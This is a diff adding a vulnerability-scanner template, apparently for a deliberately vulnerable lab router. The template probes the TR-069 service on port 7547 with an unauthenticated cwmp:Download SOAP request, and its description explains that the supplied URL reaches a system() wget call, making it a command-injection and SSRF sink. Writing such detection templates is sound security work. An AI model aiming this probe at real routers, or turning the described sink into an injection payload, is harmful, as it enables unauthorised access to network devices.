@@ -1,0 +1,39 @@
+id: malgorouter-cwmpd-download-unauth
+
+info:
+  name: MalgoRouter cwmpd - Unauthenticated TR-069 Download (command injection sink)
+  author: opencode
+  severity: critical
+  description: |
+    cwmpd (TR-069, tcp/7547) forces "authenticated" at the low difficulty
+    tier and processes cwmp:Download by running
+    "wget -q <URL> -O /tmp/cwmp_fw.bin" via system(), i.e. an
+    unauthenticated command-injection / SSRF sink. A response containing
+    <cwmp:DownloadResponse> proves the request was accepted (auth bypass).
+    Pass the target as host:7547.
+  classification:
+    cwe-id: CWE-78
+  metadata:
+    max-request: 1
+    product: malgorouter
+    vendor: glinet
+  tags: malgorouter,tr069,cmdi,unauth,cwe-78
+
+http:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+        Connection: close
+
+        <soap:Envelope><soap:Body><cwmp:Download>http://127.0.0.1/</cwmp:Download></soap:Body></soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "DownloadResponse"
+      - type: status
+        status:
+          - 200
